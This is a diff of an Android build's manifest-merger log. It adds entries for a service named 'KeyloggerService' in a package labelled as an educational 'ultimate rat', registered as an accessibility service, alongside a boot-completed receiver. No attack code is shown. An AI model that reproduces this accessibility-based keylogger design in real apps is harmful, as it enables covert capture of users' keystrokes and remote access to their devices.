@@ -1,9 +1,9 @@
 -- Merging decision tree log ---
 manifest
-ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:2:1-82:12
-INJECTED from /home/runner/workspace/app/src/main/AndroidManifest.xml:2:1-82:12
-INJECTED from /home/runner/workspace/app/src/main/AndroidManifest.xml:2:1-82:12
-INJECTED from /home/runner/workspace/app/src/main/AndroidManifest.xml:2:1-82:12
+ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:2:1-95:12
+INJECTED from /home/runner/workspace/app/src/main/AndroidManifest.xml:2:1-95:12
+INJECTED from /home/runner/workspace/app/src/main/AndroidManifest.xml:2:1-95:12
+INJECTED from /home/runner/workspace/app/src/main/AndroidManifest.xml:2:1-95:12
 MERGED from [com.karumi:dexter:6.2.3] /home/runner/.gradle/caches/transforms-3/ef3c9d86f1360d2e4ae7f6d5eb0f756a/transformed/dexter-6.2.3/AndroidManifest.xml:17:1-32:12
 MERGED from [com.google.android.material:material:1.11.0] /home/runner/.gradle/caches/transforms-3/486e23dacdbde43ae894e4a5af88064a/transformed/material-1.11.0/AndroidManifest.xml:17:1-24:12
 MERGED from [androidx.constraintlayout:constraintlayout:2.1.4] /home/runner/.gradle/caches/transforms-3/5cfd8d5cb4403da18402d4dd81ff1785/transformed/constraintlayout-2.1.4/AndroidManifest.xml:2:1-11:12
@@ -139,8 +139,8 @@ ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:40:5-76
 	android:name
 		ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:40:22-73
 application
-ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:42:5-81:19
-INJECTED from /home/runner/workspace/app/src/main/AndroidManifest.xml:42:5-81:19
+ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:42:5-94:19
+INJECTED from /home/runner/workspace/app/src/main/AndroidManifest.xml:42:5-94:19
 MERGED from [com.karumi:dexter:6.2.3] /home/runner/.gradle/caches/transforms-3/ef3c9d86f1360d2e4ae7f6d5eb0f756a/transformed/dexter-6.2.3/AndroidManifest.xml:26:5-30:19
 MERGED from [com.karumi:dexter:6.2.3] /home/runner/.gradle/caches/transforms-3/ef3c9d86f1360d2e4ae7f6d5eb0f756a/transformed/dexter-6.2.3/AndroidManifest.xml:26:5-30:19
 MERGED from [com.google.android.material:material:1.11.0] /home/runner/.gradle/caches/transforms-3/486e23dacdbde43ae894e4a5af88064a/transformed/material-1.11.0/AndroidManifest.xml:22:5-20
@@ -223,6 +223,26 @@ action#android.intent.action.BOOT_COMPLETED
 ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:77:17-79
 	android:name
 		ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:77:25-76
+service#com.remoteaccess.educational.ultimate.rat.KeyloggerService
+ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:82:9-92:19
+	android:exported
+		ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:85:13-36
+	android:permission
+		ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:84:13-79
+	android:name
+		ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:83:13-58
+intent-filter#action:name:android.accessibilityservice.AccessibilityService
+ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:86:13-88:29
+action#android.accessibilityservice.AccessibilityService
+ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:87:17-92
+	android:name
+		ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:87:25-89
+meta-data#android.accessibilityservice
+ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:89:13-91:72
+	android:resource
+		ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:91:17-69
+	android:name
+		ADDED from /home/runner/workspace/app/src/main/AndroidManifest.xml:90:17-60
 uses-sdk
 INJECTED from /home/runner/workspace/app/src/main/AndroidManifest.xml reason: use-sdk injection requested
 INJECTED from /home/runner/workspace/app/src/main/AndroidManifest.xml
